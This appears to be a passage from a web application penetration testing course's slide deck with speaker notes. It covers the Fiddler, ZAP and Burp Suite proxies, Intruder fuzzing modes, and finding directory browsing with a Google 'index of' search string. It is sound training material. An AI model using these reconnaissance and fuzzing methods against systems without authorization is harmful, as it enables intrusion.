<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 32 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  ***Fiddler***
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Fiddler is a Windows based interception proxy.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 33 -->
<!--[Title 1]-->
# Fiddler (1)


<!--[Content Placeholder 2]-->
- Free web debugging proxy
- Runs on Microsoft Windows
- Supports Extensions
	- Watcher
	- ViewStateViewer
	- x5s
- 2 Versions
	- 2 -> .Net 2.0
	- 4 -> .Net 4.0
- 

<!--[Picture 4]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Fiddler is a web debugging proxy used to intercept http(s) traffic between your computer and the web server.  It is a free tool which was purchased by Telerik in September of 2012.  Fiddler runs on Microsoft Windows.  Fiddler supports plugins, which can be very useful during assessments. 

Watcher is a web security testing tool and passive vulnerability scanner plug-in for fiddler.  It looks for cookie settings, SSL configuration, information leaks, and other issues with web applications.

ViewStateViewer is an plug-in used to view and manipulate the view state.

x5s  is a fiddler plug-in that is used to test encodings and character transformations to find XSS locations.



References:
Fiddler - http://www.fiddler2.com/fiddler2/
Watcher - http://websecuritytool.codeplex.com/
ViewStateViewer plug-in - http://labs.neohapsis.com/2009/08/03/viewstateviewer-a-gui-tool-for-deserializingreserializing-viewstate/
x5s - http://xss.codeplex.com/

<!-- SKIPPED: [Slide Number Placeholder 4]-->

---

<!-- Slide 34 -->
<!--[Title 1]-->
# Fiddler (2)


<!--[Picture 3]-->

<!--[TextBox 3]-->
HTTP Response

<!--[Left Arrow 4]-->

<!--[TextBox 3]-->
HTTP Request

<!--[Left Arrow 4]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
As we can see in this screenshot, Fiddler has a number of pieces to the interface.  On the left we see all of the requests that fiddler was able to capture. When we select one, we see the request and the response on the right side, if we have selected the *inspectors* tab.  Sometimes Fiddler will have a message that the response is encoded, but if you click that message, it will decode and display the results.  This is often because the server is sending the response gzipped to increase performance.

<!-- SKIPPED: [Slide Number Placeholder 4]-->

---

<!-- Slide 35 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	- *** OWASP Zed Attack Proxy***
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Now we are going to explore the burp suite.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 36 -->
<!--[Title 1]-->
# OWASP ZAP


<!--[Content Placeholder 2]-->
- Zed Attack Proxy is the flagship OWASP interception proxy
	- Replacing WebScarab after   
the project was abandoned
- Available at
	- http://www.owasp.org/index.php/  
OWASP_Zed_Attack_Proxy_Project
- Interception is the beginning of a robust feature set
	- Automated and Passive Scanners
	- AJAX and traditional Spidering
	- Powerful Fuzzer

<!--[Picture 3]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
	OWASP has long has WebScarab as the main proxy project.  But this project has been dead for a number of years.  Luckily, the Zed Attack Proxy project took over.  It was initially just a new instance of the Paros Proxy from years ago, but has grown into a tool set that rivals even the commercial projects.  It is a Java application that is available at http://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project.  Of course you can also go to the main page of OWASP.org and find it there.
	
	It includes a large number of featurws including an active and passive scanner.  It also has a very capable fuzzer and supports technologies such as WebSockets.

<!-- SKIPPED: [Slide Number Placeholder 4]-->

---

<!-- Slide 37 -->
<!--[Title 1]-->
# Using the Interface


<!--[Picture 4]-->

<!--[TextBox 3]-->
HTTP Response

<!--[Left Arrow 4]-->

<!--[TextBox 3]-->
Sites and pages visited

<!--[Left Arrow 4]-->

<!--[TextBox 3]-->
Functionality

<!--[Left Arrow 4]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
As we can see in the screenshot above, the interface is divided into various sections.  The top, in this view, has a list of the sites and pages visited on the left hand side, which has become standard.  On the right is a series of tabs.  The first is the quick start, which allows us to quickly tell ZAP the target of the test and start the scanning.  We also have the request and response viewers.  The last tab is the Break.  This is an interception tab that will allow the tester to stop a request from reaching the server until they can modify it and submit it.

The bottom of the interface is a series of tabs which provides various functionality.  If you double click a tab, it will fill the screen, allowing for easier use.  This is where we can control things such as the spidering and the active scanning.  We also have the alerts tab.

<!-- SKIPPED: [Slide Number Placeholder 4]-->

---

<!-- Slide 38 -->
<!--[Title 1]-->
# Scanning and Notes


<!--[Content Placeholder 2]-->
- ZAP has an active scanner
	- Fuzzes various inputs to find security flaws
- Decent at finding low hanging fruit
	- And some advanced items
- Allows for input of tester notes
	- For manually discovered issues

<!--[Picture 3]-->

<!--[Picture 4]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
If we select the active scanner, (the passive runs all the time) we can select a target in the drop down.  Then click the play button.  ZAP will then start scanning the application to find application flaws.  As it scans, we get a series of log messages letting us know what it is doing.

When any of the scans finds a potential issue, or we manually enter one, it goes into the alerts tab.  We are able to see a list of *findings* with a color based on the severity.  We then can select one to receive a description of the problem and the actual request and response that triggered the alert.

<!-- SKIPPED: [Slide Number Placeholder 4]-->

---

<!-- Slide 39 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	- *** Burp Suite***
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Now we are going to explore the burp suite.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 40 -->
<!--[Rectangle 2]-->
Burp Suite

<!--[Rectangle 3]-->
- Very powerful suite of tools available from http://portswigger.net
- Provides low-level access to the HTTP protocol
	- Burp allows us to modify requests and responses, but does not break things out in the user friendly way WebScarab does
- Requires deeper knowledge of HTTP than other similar tools
	- We covered HTTP in PEWAPT101.1 to a level of depth sufficient for using the Burp Suite effectively
- Burp it has two versions, the free and professional versions
	- The professional versions includes:
		- The ability to save and restore state
		- Search capabilities
		- Full version of Burp Intruder, including no time-based throttling and a set of attack strings
		- Burp Scanner, a web vulnerability scanner

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
The burp suite is the next set of tools we will explore.  This powerful suite of tools is available from portswigger.net and has two versions: the free version and a professional version.  The free version lacks a few of the features such as saving and loading the state of the test, an unlimited or throttled version of intruder and a full-featured web scanner.

Burp suite provides complete access to the HTTP requests and responses which we can use what we learned in PEWAPT101.1 to manipulate the requests.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 41 -->
<!--[Rectangle 2]-->
Burp Suite Components

<!--[Rectangle 3]-->
- **Burp Proxy**
	- Intercepts HTTP/S connections
-  **Burp Spider**
	- Crawls a web application
- **Burp Intruder**
	- Attack tool that contains a large number of attack methods
- **Burp Repeater**
	- Repeats interactions/attacks
- **Burp Sequencer**
	- Analyzes session tokens
- **Burp Decoder**
	- Decodes various types of   
encoding for textual  
information
- **Burp Comparer**
	- Compares two pages together, implementing a form of "diff"

<!--[Picture 4]-->

<!--[TextBox 3]-->
Raw HTTP request

<!--[Left Arrow 4]-->

<!--[TextBox 3]-->
Tabs to use each tool

<!--[Left Arrow 4]-->

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
This list shows the various parts of the Burp Suite.  All of these pieces can be used together or separately.

	- **Burp Proxy** - Intercepts and allows manipulation of HTTP/S connections between attack browser and web application
	- **Burp Spider** - crawls a web application
	- **Burp Intruder** - very flexible attack tool (customizable)
	- **Burp Repeater** - allows manipulation and repeating of interactions/attacks
	- **Burp Sequencer** - analyzes session tokens for predictability, thus the relative security against session synthesis/hijacking.
	- **Burp Decoder** - manual or "intelligent" decoding of various encoding schemes
	- **Burp Comparer** - a form of "diff", providing differences between two items of text
	- 
	The Comms tab is where we can configure a proxy or other settings related to the HTTP communication.  The alerts tab is where any messages from a tool that Burp believes the tester needs to see immediately are displayed.  These messages are things that the tester needs to answer before Burp can continue.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 42 -->
<!--[Title 1]-->
# Burp Target


<!--[Content Placeholder 2]-->
- The target maintains the state within Burp
	- Most of your mapping time is spent here
- It displays everything seen
	- Depending on filtering
- This tab allows the tester to examine the traffic
	- It also displays links seen but not visited

<!--[Picture 3]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The target tab is where you will spend most of your time during mapping.  This tab contains all of the requests the proxy sees and allows us to examine all of the requests and responses.  As we look at the screen shot above, we see that the screen is split into three areas.  On the left is a list of all of the web sites seen in the traffic.  The ones in gray were linked too, but the tester never requested them.  On the top of the right side is a list of all of the requests seen in the selected site.  This also contains gray items that were linked too but not visited.

Finally the bottom of the right hand side is the currently selected item.  We are able to see both the request and the response here, Burp allows us to choose how we would like to see it, displaying the raw item or other options as relevant to the item.  For example, if it's an HTML page, you are able to select render and see the page as a browser would display it.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 43 -->
<!--[Title 1]-->
# Filtering


<!--[Content Placeholder 2]-->
- Filtering controls display
	- The information is still within Burp
- This screen provides a number of options
	- Filtering can be done via everything from mime type to a regex
- The defaults are pretty good but hide 4XX codes
	- This prevents us from seeing incorrect links or brute force attempts

<!--[Picture 3]-->

<!--[Rectangle 4]-->
Filtering makes dealing with large targets easier!

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
One of the features that is available on the target tab is the filtering.  This is accessed by clicking on the bar across the top that lists what is being displayed.  The filtering allows us to choose between various options to control what is visible in the window.  Keep in mind that this does not remove the item from Burp's memory, it just controls whether or not we can see it. This is useful as we work in that it limits distractions by only displaying the items we are interested in.

When we look at the filtering options, there are a ton of items we can select to use within the filters.  For example, we are able to choose to only show certain status codes or specific mime types.  One point to keep in mind is that the mime type filtering is based on what Burp thinks the mime type should be, not what may be listed in the mime type within the response.

Burp does ship with some pretty good defaults for most uses except it hides 400-level status codes.  This prevents us from seeing items that require authorization using a 401 or links that are bad.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 44 -->
<!--[Title 1]-->
# Scope


<!--[Content Placeholder 2]-->
- Scope controls the automated features of Burp
	- And some other minor functions
- Scope uses basic regular expressions for matching
	- ^ for the beginning and $ for the end as simple examples
- The automated tools can be set to only run against in-scope items
	- Items such as search and save have the option to respect scope

<!--[Picture 3]-->

<!--[Rectangle 4]-->
Scope is useful mainly for automated features!

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Within the target tab, we have the idea of scope.  Scope is whether or not a page or site is considered within the scope of the test.  Keep in mind that for the most part scope controls the automated features of Burp.  For example, the automated scanner by default will only scan in-scope items.

As we mark items in scope, we have a couple options as to how.  First we can right click on something in the target tab and select "Add item to scope".  If we do this, Burp will build the scope entry based on what we have selected.  We can also just add them in the scope window.  As items are listed, the system uses regular expressions to match other items.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 45 -->
<!--[Title 1]-->
# Burp Proxy


<!--[Content Placeholder 2]-->
- Very similar to other proxies
- Its integration with the rest of the Burp Suite is its main purpose
- The proxy is the entry point for the entire tool set
- Includes fine-grained rules to determine which requests/responses are intercepted
	- These reduce the number of requests we respond too
- Proxy can also automatically rewrite HTML
	- Can be used to remove client side filtering or input limits

<!--[Picture 3]-->

<!--[TextBox 3]-->
Interception Control

<!--[Left Arrow 4]-->

<!--[TextBox 3]-->
Raw Request

<!--[Left Arrow 4]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Burp proxy is very similar to other proxies.  It can be used to intercept requests and responses for us to mangle them or it just records the requests and responses for use with the other tools within the suite.  Burp proxy has a couple other features that are of use to us during our tests.  

The first is a set of rules for which requests and responses are to be intercepted.  These rules base the decision on items such as the URL or the response code from the server.  This allows us to have better control of what requires a response from us during the test.

The second feature of interest is that burp proxy can be configured to automatically rewrite portions of the responses.  These automatic rewrite rules can be set to remove JavaScript filtering or input length limits as two examples.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 46 -->
<!--[Title 1]-->
# Options


<!--[Content Placeholder 2]-->
- The proxy options provide a number of features
	- Most are based on changing traffic
- We can control interception here
	- These allow for real-time modification of requests and responses
- Burp can be set to change the traffic
	- Before it gets to the application or browser
- For example, we can change redirect responses
	- To exploit flaws where the redirect contains data

<!--[Picture 3]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Since the proxy controls so much of Burp, it makes sense that we have a way to control the various options within it.  We are provided a series of options to control how Burp handles the traffic it sees.  For example, we are able to select if Burp is going to intercept responses or requests.  We are also able to create a series of patterns to limit what items are intercepted.

Another option we have is to build a series of rules on automatic changes Burp will make to the requests and responses it sees.  This allows us to browse through it and have Burp change things we may need to change without requiring us to intercept each and every request.  For example, Burp has a series of check boxes to perform common actions such as removing JavaScript or changing the visibility of hidden form fields.

We also have an area where we can create rules for changes needed for this specific application.  We commonly use this to prevent ourselves from leaving the target application.  It is quite common for us to be testing an application such as http://dev.secureideas.net but the application links to www.secureideas.net.  By having Burp change all of the www to dev, we won't accidentally move to the production site.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 47 -->
<!--[Title 1]-->
# Web Interface


<!--[Content Placeholder 2]-->
- The proxy has a web interface
	- Really a display of the history
- This is only accessible through the proxy
	- One of the reasons to constrain the proxy listener
- This allows for displaying the traffic seen
	- Also has a button   
to have the   
browser repeat the   
request

<!--[Picture 3]-->

<!--[Picture 4]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Burp also has a web interface that is accessible to any browser using Burp as a proxy.  If the tester enters http://burp, Burp displays a list of all the requests it has seen.  This allows us to browse through them quite quickly and the select ones that are interesting to us.

When we select one, we are shown the entire request.  We can then either choose to examine the response or repeat the request in the browser.  This allows us to test out things such as replay attacks or CSRF.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 48 -->
<!--[Title 1]-->
# Burp Spider


<!--[Content Placeholder 2]-->
- Burp spider is fed by the proxy
- Any HTTP request sent through the proxy can be used to start the spider
	- By default it will start with the most recent
- It is one of the more capable spiders
	- Handles some of the more difficult client-side code
- The spider can authenticate using provided credentials
- Spider also stores pre-determined answers for forms

<!--[Picture 3]-->

<!--[TextBox 3]-->
Scope Control

<!--[Left Arrow 4]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The burp spider is the part of the suite that will spider a web site and retrieve the various pages that make it up.  There are two ways to feed the spider the beginning URL.  The first is to right click on a URL in the target tab and select send to spider.  The second is that if we just click "Spider running", it will spider from the last request seen by the proxy.

Burp spider can handle some of the more complex web application such as AJAX applications and sites that use other JavaScript to build the URLs.

With forms that require an answer, burp spider will either prompt the user to answer the form or we can configure it with some predetermined answers.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 49 -->
<!--[Title 1]-->
# Burp Intruder


<!--[Content Placeholder 3]-->
- Burp Intruder is the automated attack tool within the suite
- We send requests from the other tools to the intruder
- We can then choose which attacks we would like to run

<!--[Picture 1]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The Burp Intruder is the automated attack tool within the suite.  The Intruder is limited with in the free version of Burp, but still contains numerous attacks within it.  When we send requests to the intruder, it attempts to automatically determine which parameters should be targeted.  We are able to use the buttons on the right hand side of the screen to move this selection.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 50 -->
<!--[Title 1]-->
# Fuzzing Types


<!--[Content Placeholder 2]-->
- Intruder has four fuzzing types
	- Based on how payloads are used
- Sniper - Most commonly used
	- Each position is fuzzed, one at a time
	- Most fuzzing attacks work here
- Battering Ram
	- One set of payloads is injected into all positions
	- Useful is more than one parameter needs to be set the same
- Pitchfork
	- Each position is fuzzed simultaneously
	- Useful if related injections are needed
- Cluster Bomb
		- Iterates through each position's payloads
		- Similar to sniper except for multiple positions at once

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Intruder has four fuzzing types that allow us to decide how it will attack the request.  These are based on how payloads are used within the request.  These types are as follows:

- Sniper
		- Each position is fuzzed, one at a time
		- Most fuzzing attacks work here
- Battering Ram
		- One set of payloads is injected into all positions
		- Useful is more than one parameter needs to be set the same
- Pitchfork
		- Each position is fuzzed simultaneously
		- Useful if related injections are needed
- Cluster Bomb
			- Iterates through each position's payloads
			- Similar to sniper except for multiple positions at once

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 51 -->
<!--[Title 1]-->
# Payloads


<!--[Content Placeholder 2]-->
- Payloads are the injected values
- Intruder contains some basic ones
	- But allows for additional ones
	- FuzzDB is an excellent source!
- Intruder includes the ability to process the payloads
	- Match and replace or encode for example
- It displays approximately how many requests it will make
	- Based on your choices and attack type

<!--[Picture 3]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
As we use Intruder, the payloads are what are actually used to test the requests.  We decide what type of attack we are looking to be able to perform and then choose payloads based on that.  For example, we would use a dictionary to perform a brute force attack but would use various attack strings to find SQL injection. 

 As we set up our fuzzing session, we would pick the various payloads from the drop down.  We have the option to use various items such as UNICODE characters, various characters and preset lists.  We can also choose to load our attacks from a prepared file.  For this, FuzzDB is an excellent source.

As we set up the attack we also have the ability to set up processing rules.  These allow for actions such as URL or BASE64 encoding the payload before making the request.  

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 52 -->
<!--[Title 1]-->
# Burp Repeater


<!--[Content Placeholder 2]-->
- The repeater is used to resubmit transactions
- We use this to verify results we have found in the other parts of Burp
- Repeater allows us to see both the request that was sent and the response from the application
- Whether to follow redirects or not is a configurable option
	- If so, it stops after 10 to prevent infinite loops 
- We can also use this to manually modify the request before submitting it

<!--[Picture 1]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The burp repeater is used for us to examine and mangle requests that have been made.  We are able to examine both the request and the response.

We can use the repeater to verify any findings that have been gathered during our testing and to manually check for other flaws.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 53 -->
<!--[Title 1]-->
# Burp Sequencer


<!--[Content Placeholder 2]-->
- The sequencer is used to analyze the randomness of session tokens
- Burp sequencer performs a large number of tests to determine the randomness
	- Way beyond just graphing the results
- It runs the various tests and automatically analyzes the results
	- FIPS 140-2 tests
	- Compressing the values using ZLIB since predictable session compress better
	- Correlation tests that also determine predictability
- It includes excellent descriptions for the non-mathematicians

<!--[Picture 2]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The burp sequencer is used to determine the predictability of the session token used by the application.  Burp attempts to detect the session token automatically, but sometimes we need to select the token in the selected response.

Burp sequencer actually attempts to detect predictable session tokens using a number of different tests.  This gives us a much better chance of detecting predictable sessions than just graphing the results.

It will perform a number of FIPS 140-2 tests, which use techniques used in cryptanalysis to determine the entropy within the tokens.  It will also perform compression on the tokens since predictable tokens compress smaller than unpredictable tokens.  Burp sequencer also performs correlation tests to find patterns similar to WebScarab's graphing.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 54 -->
<!--[Title 1]-->
# Burp Decoder


<!--[Content Placeholder 2]-->
- The decoder included in Burp is an excellent way to determine the specific data passed  
by the application
- It is able to automatically determine which encoding scheme is used in a cookie or   
value
	- It understands URL, HTML, BASE64, ASCII, octal, hex, binary and even gzip
- Let's say an application responds with a cookie value that appears to be garbage
- Using the decoder we may find that it is simply our user name BASE64 encoded
- The decoder name is misleading because it will also encode data
	- We use this to modify the data and then submit it using the encoding the application expected
	- Depending on our version of Java, it also supports hashing data with SHA1 and MD5	

<!--[Rectangle 6]-->

<!--[Picture 1]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The Burp decoder is used to encode and decode data used by the application.  It is very common for us to see information that is base64 or URL encoded being used.  Using the decoder we can decode it, determine what the information is and then encode any changes we want to make to the data.

We also see data that has been md5 or sha1 hashed.  While the decoder cannot reverse these, we can try to guess what the data is and hash it to compare.

There are two ways to get data of interest to the decoder.  The first is to simply type it into the fields on the decoder tab of Burp.  The second is the select the data of interest in another tab, right click on it and select "send to decoder".

We then select what encoding/hashing we would like to perform and it displays the results in the bottom field.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 55 -->
<!--[Title 1]-->
# Burp Comparer


<!--[Content Placeholder 2]-->
- The comparer allows us to look at two different items and see the differences
- It can see differences at the byte level or in the words
	- It uses whitespace to determine words
- We commonly use this to see the results from using Intruder against a page or in user harvesting flaws
- The comparer can use any request in the Burp session or we can load them from files

<!--[Picture 2]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The Burp comparer is the final part of the suite to discuss.  It is used to show us the differences between two requests or responses.  This is a great way to determine if our mangled requests have caused a different response from the application.  We can also find harvesting type issues this way.

The comparer uses two different methods to see differences.  It compares at the byte level and the word level.  Byte level comparison is as simple as it sounds.  The word level comparison uses whitespace to delineate words.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 56 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- ***Interception Exercise****** ***
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this next exercise we will explore the burp suite.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 57 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
- *** Information Leakage &   
    Directory Browsing***
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Information leakage is one of the basic flaws.  But it reveals information that makes all of the other attacks easier and more successful.  As testers, we need to realize that information is power.  The more information we have regarding our target, the easier our attacks become.  As we discussed on day 2, we should have a lot of information available already.  This next section will discuss adding to it via various flaws.


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 58 -->
<!--[Rectangle 2]-->
Information Leakage

<!--[Rectangle 3]-->
- Information leakage is when the application or target provides information to the user unintentionally
- One of the simplest forms of vulnerabilities
- When testing an application, information is power
	- .So even information that may seem unimportant on the surface can actually be used against an application
	- For example, image directories that allow browsing can show page headers and menu graphics that reveal portions of the site the client doesn't have access too
- During recon and mapping, we may have gathered some of this information, but now let's find more while manually interacting with the application

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
"Information leakage" is a simple form of attack, in which you search for information which is not supposed to be available to you.  This can be in the form of files, "hidden" directories, Microsoft Office files with change-tracking, and more.  We have already explored information leakage during the recon step of the test.  Mapping also will find other information leakage.  Here we will be exploring info leakage that takes a little more effort to find.  ?

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 59 -->
<!--[Title 1]-->
# Types of Information Leakage


<!--[Content Placeholder 2]-->
- Information can come in many forms
	- Architecture Information
	- Configuration Information
	- File Paths
	- Accounts
	- Etc.
- This information can lead to other vulnerabilities
	- Rarely direct exploitation

<!--[Picture 3]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Information can come in many forms
	Architecture Information
	Configuration Information
	File Paths
	Accounts
	Etc.
This information can lead to other vulnerabilities
	Rarely direct exploitation

<!-- SKIPPED: [Slide Number Placeholder 4]-->

---

<!-- Slide 60 -->
<!--[Rectangle 2]-->
Directory Browsing

<!--[Rectangle 3]-->
- Directory browsing is a feature of web servers, describing how the web server will react if a user surfs to a directory, not an specific page
	- Option 1: There is an index file, such as index.php, default.htm, or others, the server is configured to display from that directory when the directory is accessed
	- Option 2: The server may automatically generate a directory index and return that to the client, if it is configured to do so
	- Option 3: The server responds with an error message of some sort, such as 403 Forbidden
- Can reveal more than intended, such as configuration or include files
- Discoverable via several methods:
	- Google Searches
	- Manually
	- Automatically

<!--[Picture 1]-->

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
By default, most web servers provide directory listings with point-and-click access to files and directories for easy interaction.  This functionality has generally been discouraged and is seldom left enabled on production servers, but is one of the things often overlooked until security testing.

Information that should not be seen by the public should be removed from web directories.  You will often be amazed at what has been left available, even in hidden directories.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 61 -->
<!--[Title 1]-->
# Google Searching for Directory Browsing


<!--[Content Placeholder 2]-->
- Google can provide us with directories it has found in a site
- During Recon, we may have performed this search
- Many different search strings are possible to find such functionality, but our favorite is:
	- **intitle:"index of" "last modified"**
		- Searches the title for "index of"
		- Searches the content on the page for "last modified" - Remember that Google searches are case insensitive
- During pen tests, we probably want to focus this search with a site: directive
	- **site:target.domain**

<!--[Picture 3]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Google is amazing for finding pages with this functionality enabled.  While most people use Google as we did yesterday, it is even more useful finding vulnerabilities such as this one.

Search for:
	intitle:"Index of" "Last Modified"
Narrow the search more with:
	Site:targetdomain.tld

The intitle: tells Google to only show pages that include "Index of" in the title.  And the "Last Modified" must be within the body of the page.

This would have been found during recon, but we discuss it here for relevance.


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 62 -->
<!--[Rectangle 2]-->
Manual Discovery   
of Directory Browsing

<!--[Rectangle 3]-->
